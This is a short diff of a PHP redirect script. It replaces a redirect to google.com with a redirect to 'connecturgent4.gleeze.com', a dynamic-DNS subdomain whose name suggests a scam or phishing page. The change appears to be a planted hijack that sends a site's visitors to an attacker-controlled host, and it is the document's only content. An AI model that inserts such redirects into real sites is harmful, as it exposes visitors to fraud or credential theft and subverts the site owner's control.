@@ -1,7 +1,7 @@
 <?php 
   
 // Redirect browser 
-header("Location: https://google.com"); 
+header("Location: https://connecturgent4.gleeze.com/"); 
   
 exit; 
 ?> 
